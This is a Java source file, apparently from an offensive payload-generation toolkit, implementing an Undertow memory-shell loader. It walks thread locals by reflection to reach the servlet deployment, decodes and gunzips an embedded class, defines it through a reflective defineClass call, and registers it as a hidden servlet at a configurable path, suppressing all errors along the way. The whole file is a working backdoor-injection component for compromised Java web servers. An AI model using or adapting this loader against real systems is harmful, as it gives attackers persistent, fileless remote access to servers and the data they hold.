package com.ppp.middleware.loader;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.JavaClassType;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.Middleware;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 * <p>
 */
@Middleware(Middleware.Undertow)
@MemShell(MemShell.Servlet)
@JavaClassType(JavaClassType.Default)
@JavaClassModifiable({JavaClassModifiable.CLASSNAME, JavaClassModifiable.PATH, JavaClassModifiable.NAME})
public class UndertowServletThreadLoader {
    private static String gzipObject;
    private static String CLASSNAME;
    private static String PATH;
    private static String NAME;

    public UndertowServletThreadLoader() {
        try {
            // 获取 ServletRequestContext
            Object servletRequestContext = getServletRequestContext();

            inject(servletRequestContext);
        } catch (Throwable e) {

        }
    }

    public static void inject(Object servletRequestContext) throws Exception {
        Object deployment = getFieldValue(servletRequestContext, "deployment");
        Object deploymentInfo = getFieldValue(deployment, "deploymentInfo");
        Map servlets = (Map) getFieldValue(deploymentInfo, "servlets");
        if (servlets.containsKey(NAME)) {
            return;
        }

        // 动态代理兼容 javax jakarta
        Class servletClass = null;
        try {
            servletClass = Class.forName("jakarta.servlet.Servlet");
        } catch (Exception e) {
            try {
                servletClass = Class.forName("javax.servlet.Servlet");
            } catch (ClassNotFoundException ex) {

            }
        }

        byte[] bytes = decompress(gzipObject);
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defineClass.setAccessible(true);
        Class clazz;
        try {
            clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
        } catch (Exception e) {
            clazz = classLoader.loadClass(CLASSNAME);
        }
        Object javaObject = clazz.newInstance();
        Object object = Proxy.newProxyInstance(servletClass.getClassLoader(), new Class[]{servletClass}, (InvocationHandler) javaObject);

        // 新建
        Object instanceFactory = Class.forName("io.undertow.servlet.util.ImmediateInstanceFactory").getDeclaredConstructor(Object.class).newInstance(object);
        Object servletInfo = Class.forName("io.undertow.servlet.api.ServletInfo").getConstructor(String.class, Class.class, Class.forName("io.undertow.servlet.api.InstanceFactory")).newInstance(NAME, object.getClass(), instanceFactory);

        invokeMethod(servletInfo, "addMapping", new Class[]{String.class}, new Object[]{PATH});
        invokeMethod(deploymentInfo, "addServlet", new Class[]{Class.forName("io.undertow.servlet.api.ServletInfo")}, new Object[]{servletInfo});
        Object managedServlets = getFieldValue(deployment, "servlets");
        invokeMethod(managedServlets, "addServlet", new Class[]{Class.forName("io.undertow.servlet.api.ServletInfo")}, new Object[]{servletInfo});
    }

    public static Object getServletRequestContext() throws Exception {
        try {
            Object threadLocals = getFieldValue(Thread.currentThread(), "threadLocals");
            Object[] table = (Object[]) getFieldValue(threadLocals, "table");

            for (int i = 0; i < table.length; i++) {
                Object entry = table[i];
                if (entry == null)
                    continue;
                Object value = getFieldValue(entry, "value");
                if (value == null)
                    continue;
                if (value.getClass().getName().equals("io.undertow.servlet.handlers.ServletRequestContext")) {
                    return value;
                }
            }
        } catch (Exception e) {

        }
        return null;
    }

    // tools
    public static byte[] decompress(String gzipObject) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(base64(gzipObject));
        try {
            GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        } catch (Exception e) {

        }
        return null;
    }

    public static byte[] base64(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) invokeMethod(clazz.getSuperclass(), clazz.newInstance(), "decodeBuffer", new Class[]{String.class}, new Object[]{str});
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = invokeMethod(clazz, null, "getDecoder", new Class[]{}, new Object[]{});
            return (byte[]) invokeMethod(decoder.getClass(), decoder, "decode", new Class[]{String.class}, new Object[]{str});
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        try {
            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
        } catch (Exception e) {
            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
        }
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

}
